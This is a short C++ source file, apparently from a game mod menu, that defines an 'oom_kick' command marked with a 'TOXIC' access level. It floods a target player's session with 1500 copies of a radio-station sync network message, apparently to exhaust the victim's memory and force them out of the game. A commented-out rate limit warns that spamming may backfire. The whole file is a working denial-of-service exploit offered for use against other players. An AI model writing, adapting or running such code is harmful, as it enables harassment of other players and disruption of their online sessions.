#include "backend/player_command.hpp"
#include "core/scr_globals.hpp"
#include "natives.hpp"
#include "packet.hpp"
#include "pointers.hpp"
#include "util/scripts.hpp"

#include <network/snSession.hpp>

namespace big
{
	class oom_kick : player_command
	{
		using player_command::player_command;

		std::chrono::system_clock::time_point last_oom_kick_time{};

		virtual CommandAccessLevel get_access_level()
		{
			return CommandAccessLevel::TOXIC;
		}

		virtual void execute(player_ptr player, const std::vector<uint64_t>& _args, const std::shared_ptr<command_context> ctx)
		{
			//if (std::chrono::system_clock::now() - last_oom_kick_time < 7s)
			//{
			//	g_notification_service->push_error("Kick", "Don't spam this or it will backfire");
			//	return;
			//}

			last_oom_kick_time = std::chrono::system_clock::now();

			packet msg{};

			msg.write_message(rage::eNetMessage::MsgRadioStationSyncRequest);
			auto msg_id = player->get_session_player()->m_msg_id;

			for (int j = 0; j < 1500; j++)
			{
				msg.send(msg_id);
			}
		}
	};

	oom_kick g_oom_kick("oomkick", "OOM_KICK_CMD", "OOM_KICK_CMD_DESC", 0, false);
}